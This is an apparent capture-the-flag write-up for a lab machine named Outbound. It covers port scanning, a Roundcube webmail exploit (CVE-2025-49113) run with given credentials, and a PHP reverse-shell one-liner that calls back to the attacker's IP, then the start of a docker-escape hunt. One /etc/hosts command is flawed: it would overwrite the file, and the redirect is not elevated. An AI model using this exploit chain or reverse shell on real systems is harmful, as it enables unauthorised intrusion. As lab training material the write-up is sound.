![[Outbound-00.png]]
## Given Information
```username
tyler
```

```password
LhKL1o9Nm3X2
```

## Network Scan

### Rustscan

```bash
rustscan -a 10.10.11.77
```

#### Output

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.77:22
Open 10.10.11.77:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 11:28 UTC
Initiating Ping Scan at 11:28
Scanning 10.10.11.77 [4 ports]
Completed Ping Scan at 11:28, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:28
Completed Parallel DNS resolution of 1 host. at 11:28, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:28
Scanning 10.10.11.77 [2 ports]
Discovered open port 80/tcp on 10.10.11.77
Discovered open port 22/tcp on 10.10.11.77
Completed SYN Stealth Scan at 11:28, 0.11s elapsed (2 total ports)
Nmap scan report for 10.10.11.77
Host is up, received echo-reply ttl 62 (0.065s latency).
Scanned at 2025-07-24 11:28:53 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

So we have 2 ports open ssh and http, lets enumerate further!

## Enumeration

Opening the website in Web Browser redirected us to `mail.outbout.htb` let's add that to our `/etc/hosts` file before beginning the web enumeration.

```bash
sudo echo "10.10.11.77 outbound.htb mail.outbound.htb" > /etc/hosts
```

### WebApp Enumeration(Manual Approach)

| ![[Outbound-01.png]] |
| :------------------: |
|     *RoundCube*      |
* Its a roundcube mail interface lets login using the default password and check if we can enumerate further.

|    ![[Outbound-02.png]]     |
| :-------------------------: |
| *Roundcube Webmail Version* |
* After logging in there wasn't much to find but i got the version of Roundcube webmail.

### CVE-2025-49113
* After checking the Version on the web, we found out that the Roundcube version 1.16.10 is vulnerable to PHP object deserialization flaw.[Reference](https://www.offsec.com/blog/cve-2025-49113/)
* We also found a working exploit on [Github](https://github.com/fearsoff-org/CVE-2025-49113)
## Initial Foothold
Let's Clone the exploit repo and exploit the vulnerability.
```bash
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113/
```

We can execute code on the remote machine so lets try getting a reverse shell, most of the payloads didn't work so i used this PHP payload.

```bash
php -r '\$s=fsockopen(\"$tun0\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'
```
Where $tun0 is my vpn ip and 4444 is the port i am listening on.

Final command to get the shell

```bash
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "php -r '\$s=fsockopen(\"10.10.16.11\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'"
```

I got a reverse shell on my pwncat shell (You can also use Netcat).

```bash
pwncat-cs -lp 4444
```

Output
```bash
[20:58:28] 10.10.11.77:44592: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                                     manager.py:957
[20:58:32] 10.10.11.77:44592: registered new host w/ db                                                                                                                         manager.py:957
[20:58:40] listener: 0.0.0.0:4444: linux session from 10.10.11.77:44592 established                                                                                             manager.py:957
```

Hit Ctrl + d

We got a shell from the user www-data!

### Escaping the docker

* First lets switch user to Tyler since we know the password and we can enumerate further for any privilege escalation vector 
```bash
www-data@mail.outbound.htb:/var/www/html/roundcube/public_html$ su tyler
```

Enter the password of tyler and boom!

| ![[Outbound-03.png]] |
| :------------------: |
| *A shell with tyler* |
We didn't find much in Tyler and there was no flag in home directory of Tyler.
After a few manual enumeration i saw .dockerenv file in the root directory making it obvious that we are in a docker container, i started looking for docker breakout but could not find anything useful so i ran linpeas and found this

|  ![[Outbound-04.png]]   |
| :---------------------: |
| *Roundcube config file* |
